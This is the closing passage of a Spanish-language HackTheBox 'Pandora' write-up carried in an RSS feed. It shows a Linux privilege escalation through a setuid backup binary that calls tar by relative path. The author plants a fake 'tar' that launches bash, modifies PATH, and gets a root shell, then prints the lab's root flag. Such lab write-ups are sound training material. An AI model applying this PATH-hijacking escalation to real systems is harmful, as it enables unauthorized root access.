-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        55K Jul &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/bin/mount
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        44K Jul &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/bin/newgrp
-rwsr-x--- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   matt        17K Dec  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 15:58 /usr/bin/pandora_backup
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        67K Jul &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/bin/passwd
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        31K May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/bin/pkexec
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        67K Jul &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/bin/su
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       163K Jan &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/bin/sudo
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        39K Jul &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/bin/umount
-rwsr-xr-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   messagebus  51K Jun &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        15K Jul  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       463K Jul &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/lib/openssh/ssh-keysign
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        23K May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/lib/policykit-1/polkit-agent-helper-1
matt@pandora:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que es un ejecutable y realiza un &amp;lsquo;backup&amp;rsquo; de &amp;lsquo;/var/www/pandora/pandora_console/&amp;rsquo; segun el output.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;matt@pandora:~$ file /usr/bin/pandora_backup
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SYSV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;]=&lt;/span&gt;7174c3b04737ad11254839c20c8dab66fce55af8, &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, not stripped
matt@pandora:~$ /usr/bin/pandora_backup &amp;gt; out.txt
tar: Removing leading &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;/&lt;span class=&#34;s1&#34;&gt;&amp;#39; from member names
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;tar: Removing leading `/&amp;#39;&lt;/span&gt; from hard link targets
matt@pandora:~$ cat out.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v var
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
matt@pandora:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Localmente ejecutamos &lt;code&gt;strings&lt;/code&gt; sobre este archivo, vemos que utiliza &lt;code&gt;tar&lt;/code&gt; para comprimir la carpeta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ strings pandora_backup
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;A&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;A^A_
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
Check your permissions!
Backup successful!
Terminating program!
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
.comment
 π ~/htb/pandora ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;tar&lt;/code&gt; no muestra su directorio completo por lo que podriamos realizar &lt;code&gt;PATH Hijacking&lt;/code&gt;. Creamos el archivo &lt;code&gt;tar&lt;/code&gt;, agregamos &lt;code&gt;bash&lt;/code&gt; dentro, hacemos ejecutable el archivo y finalmente modificamos la variable &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;matt@pandora:~$ touch tar
matt@pandora:~$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt; &amp;gt; tar
matt@pandora:~$ chmod +x tar
matt@pandora:~$ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;.:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutar el fichero logramos obtener una shell como root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id
root
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;matt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;matt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@pandora:~# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root
root@pandora:/root# ls
root.txt
root@pandora:/root# cat root.txt
150a3751f50bf86fecd20f8a5d0e20d8
root@pandora:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/pandora/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/pandora/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>snmp</category>
            
          
            
              <category>snmp-check</category>
            
          
            
              <category>pandora fms</category>
            
          
            
              <category>sqli</category>
            
          
            
              <category>rce</category>
            
          
            
              <category>tar</category>
            
          
            
              <category>suid</category>
            
          
            
              <category>path-hijacking</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>